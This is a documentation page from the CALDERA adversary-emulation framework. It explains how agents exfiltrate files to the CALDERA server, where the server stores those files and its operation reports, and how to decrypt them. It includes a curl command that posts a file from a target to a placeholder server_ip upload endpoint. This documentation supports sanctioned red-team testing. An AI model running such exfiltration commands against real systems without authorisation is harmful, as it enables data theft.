

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>Exfiltration &mdash; caldera  documentation</title>
  

  
  
  
  

  
  <script type="text/javascript" src="_static/js/modernizr.min.js"></script>
  
    
      <script type="text/javascript" id="documentation_options" data-url_root="./" src="_static/documentation_options.js"></script>
        <script data-url_root="./" id="documentation_options" src="_static/documentation_options.js"></script>
        <script src="_static/jquery.js"></script>
        <script src="_static/underscore.js"></script>
        <script src="_static/_sphinx_javascript_frameworks_compat.js"></script>
        <script src="_static/doctools.js"></script>
    
    <script type="text/javascript" src="_static/js/theme.js"></script>

    

  
  <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
  <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
  <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
  <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
    <link rel="index" title="Index" href="genindex.html" />
    <link rel="search" title="Search" href="search.html" />
    <link rel="next" title="Peer-to-Peer Proxy Functionality for Sandcat Agents" href="Sandcat-Peer-to-Peer.html" />
    <link rel="prev" title="Dynamically-Compiled Payloads" href="Dynamically-Compiled-Payloads.html" /> 
</head>

<body class="wy-body-for-nav">

   
  <div class="wy-grid-for-nav">
    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >
          

          
            <a href="index.html">
          

          
            
            <img src="_static/caldera-logo.png" class="logo" alt="Logo"/>
          
          </a>

          
            
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption" role="heading"><span class="caption-text">Usage Guides</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="Installing-CALDERA.html">Installing CALDERA</a></li>
<li class="toctree-l1"><a class="reference internal" href="Getting-started.html">Getting started</a></li>
<li class="toctree-l1"><a class="reference internal" href="Learning-the-terminology.html">Learning the terminology</a></li>
<li class="toctree-l1"><a class="reference internal" href="Basic-Usage.html">Basic Usage</a></li>
<li class="toctree-l1"><a class="reference internal" href="Server-Configuration.html">Server Configuration</a></li>
<li class="toctree-l1"><a class="reference internal" href="Plugin-library.html">Plugin library</a></li>
<li class="toctree-l1"><a class="reference internal" href="Parsers.html">Parsers</a></li>
<li class="toctree-l1"><a class="reference internal" href="Relationships.html">Relationships</a></li>
<li class="toctree-l1"><a class="reference internal" href="Requirements.html">Requirements</a></li>
<li class="toctree-l1"><a class="reference internal" href="Objectives.html">Objectives</a></li>
<li class="toctree-l1"><a class="reference internal" href="Operation-Results.html">Operation Results</a></li>
<li class="toctree-l1"><a class="reference internal" href="Initial-Access-Attacks.html">Initial Access Attacks</a></li>
<li class="toctree-l1"><a class="reference internal" href="Lateral-Movement-Guide.html">Windows Lateral Movement Guide</a></li>
<li class="toctree-l1"><a class="reference internal" href="Dynamically-Compiled-Payloads.html">Dynamically-Compiled Payloads</a></li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">Exfiltration</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#exfiltrating-files">Exfiltrating Files</a></li>
<li class="toctree-l2"><a class="reference internal" href="#accessing-exfiltrated-files">Accessing Exfiltrated Files</a></li>
<li class="toctree-l2"><a class="reference internal" href="#accessing-operations-reports">Accessing Operations Reports</a></li>
<li class="toctree-l2"><a class="reference internal" href="#unencrypting-the-files">Unencrypting the files</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="Sandcat-Peer-to-Peer.html">Peer-to-Peer Proxy Functionality for Sandcat Agents</a></li>
<li class="toctree-l1"><a class="reference internal" href="C2-Tunneling.html">C2 Communications Tunneling</a></li>
<li class="toctree-l1"><a class="reference internal" href="Uninstalling-CALDERA.html">Uninstall CALDERA</a></li>
<li class="toctree-l1"><a class="reference internal" href="Troubleshooting.html">Troubleshooting</a></li>
<li class="toctree-l1"><a class="reference internal" href="resources.html">Resources</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Plugin Documentation</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="plugins/sandcat/Sandcat-Details.html">Sandcat Plugin Details</a></li>
<li class="toctree-l1"><a class="reference internal" href="plugins/stockpile/Exfiltration-How-Tos.html">Exfiltration Scenarios and Setup</a></li>
<li class="toctree-l1"><a class="reference internal" href="plugins/stockpile/Exfiltration-How-Tos.html#an-example">An Example</a></li>
<li class="toctree-l1"><a class="reference internal" href="plugins/stockpile/Exfiltration-How-Tos.html#wrap-up">Wrap-up</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Developer Information</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="The-REST-API.html">The REST API</a></li>
<li class="toctree-l1"><a class="reference internal" href="How-to-Build-Plugins.html">How to Build Plugins</a></li>
<li class="toctree-l1"><a class="reference internal" href="How-to-Build-Planners.html">How to Build Planners</a></li>
<li class="toctree-l1"><a class="reference internal" href="How-to-Build-Agents.html">How to Build Agents</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Core System API</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="_generated/modules.html">app</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="index.html">caldera</a>
        
      </nav>


      <div class="wy-nav-content">
        
        <div class="rst-content">
        
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="index.html">Docs</a> &raquo;</li>
        
      <li>Exfiltration</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="_sources/Exfiltration.md.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="exfiltration">
<h1>Exfiltration<a class="headerlink" href="#exfiltration" title="Permalink to this heading">¶</a></h1>
<p>After completing an operation a user may want to review the data retreived from the target system. This data is automatically stored on the CALDERA server in a directory specified in <a class="reference internal" href="Server-Configuration.html#configuration-file"><span class="std std-doc">/conf/default.yml</span></a>.</p>
<div class="section" id="exfiltrating-files">
<h2>Exfiltrating Files<a class="headerlink" href="#exfiltrating-files" title="Permalink to this heading">¶</a></h2>
<p>Some abilities will transfer files from the agent to the CALDERA server. This can be done manually with</p>
<div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">curl -X POST -F &#39;data=@/file/path/&#39; http://server_ip:8888/file/upload</span>
</pre></div>
</div>
<p>Note: localhost could be rejected in place of the server IP. In this case you will get error 7. You should type out the full IP.
These files are sent from the agent to server_ip/file/upload at which point the server places these files inside the directory specified by <a class="reference internal" href="Server-Configuration.html#configuration-file"><span class="std std-doc">/conf/default.yml to key “exfil_dir”</span></a>. By default it is set to <code class="docutils literal notranslate"><span class="pre">/tmp/caldera</span></code>.</p>
</div>
<div class="section" id="accessing-exfiltrated-files">
<h2>Accessing Exfiltrated Files<a class="headerlink" href="#accessing-exfiltrated-files" title="Permalink to this heading">¶</a></h2>
<p>The server stores all exfiltrated files inside the directory specified by <a class="reference internal" href="Server-Configuration.html#configuration-file"><span class="std std-doc">/conf/default.yml to key “exfil_dir”</span></a>. By default it is set to <code class="docutils literal notranslate"><span class="pre">/tmp/caldera</span></code>.</p>
<p>Files can be accessed by pulling them directly from that location when on the server and manually unencrypting the files.</p>
<p>To simplify accessing exfiltrated files from a running caldera server, you can go the the advanced section in the CALDERA UI and click on the ‘exfilled files’ section.</p>
<p>From there you can select an operation (or all) from the drop down to see a listing of all the files in the exfil folder corresponding to the operation (specifically works with sandcat agents or any other agent using the same naming scheme for file upload folder) or in the directory along with the option to select any number of files to download directly to your machine.</p>
<p>All downloaded files will be unencrypted before passing along as a download.</p>
</div>
<div class="section" id="accessing-operations-reports">
<h2>Accessing Operations Reports<a class="headerlink" href="#accessing-operations-reports" title="Permalink to this heading">¶</a></h2>
<p>After the server is shut down the reports from operations are placed inside the directory specified by the <a class="reference internal" href="Server-Configuration.html#configuration-file"><span class="std std-doc">/conf/default.yml to key “reports_dir”</span></a>. By default it is also set to <code class="docutils literal notranslate"><span class="pre">/tmp</span></code>.</p>
</div>
<div class="section" id="unencrypting-the-files">
<h2>Unencrypting the files<a class="headerlink" href="#unencrypting-the-files" title="Permalink to this heading">¶</a></h2>
<p>The reports and exfiltrated files are encrypted on the server. To view the file contents the user will have to decrypt the file using /app/utility/file_decryptor.py . This can be performed with:</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span>python<span class="w"> </span>/app/utility/file_decryptor.py<span class="w"> </span>--config<span class="w"> </span>/conf/default.yml<span class="w"> </span>_input<span class="w"> </span>file<span class="w"> </span>path_
</pre></div>
</div>
<p>The output file will already have the _decrypted tag appended to the end of the file name once the decrypted file is created by the python script.</p>
</div>
</div>


           </div>
           
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="Sandcat-Peer-to-Peer.html" class="btn btn-neutral float-right" title="Peer-to-Peer Proxy Functionality for Sandcat Agents" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="Dynamically-Compiled-Payloads.html" class="btn btn-neutral float-left" title="Dynamically-Compiled Payloads" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2023, The MITRE Corporation

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script>

  
  
    
   

</body>
</html>